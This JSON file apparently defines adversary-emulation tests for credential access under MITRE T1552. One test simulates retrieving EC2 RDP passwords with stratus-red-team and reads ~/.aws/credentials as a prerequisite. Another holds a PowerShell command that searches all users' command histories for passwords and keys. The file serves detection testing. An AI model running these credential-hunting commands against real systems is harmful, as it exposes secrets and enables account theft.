{
  "attack_technique": "T1552",
  "display_name": "Unsecured Credentials",
  "atomic_tests": [
    {
      "name": "AWS - Retrieve EC2 Password Data using stratus",
      "description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/",
      "supported_platforms": [
        "linux",
        "macos",
        "iaas:aws"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*",
        "procedure": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force"
      },
      "input_arguments": [
        {
          "arg_name": "stratus_path",
          "description": "Path of stratus binary",
          "type": "path",
          "default": "$PathToAtomicsFolder/T1552/src"
        },
        {
          "arg_name": "aws_region",
          "description": "AWS region to detonate",
          "type": "string",
          "default": "us-west-2"
        }
      ],
      "dependencies": [
        {
          "description": "Stratus binary must be present at the (#{stratus_path}/stratus)",
          "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;",
          "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi"
        },
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured",
          "prereq_command": "cat ~/.aws/credentials | grep \"default\"",
          "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure"
        }
      ],
      "auto_generated_guid": "a21118de-b11e-4ebd-b655-42f11142df0c"
    },
    {
      "name": "Search for Passwords in Powershell History",
      "description": "Find passwords in the powershell history files\nSearching for following strings: \"password\", \"-p\", \"key\", \"pwd\", \"pass\"",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "ls -R C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Select-String \"password\", \"-p\", \"key\", \"pwd\", \"pass\""
      },
      "input_arguments": [],
      "auto_generated_guid": "f9c3d0ab-479b-4019-945f-22ace2b1731a"
    }
  ]
}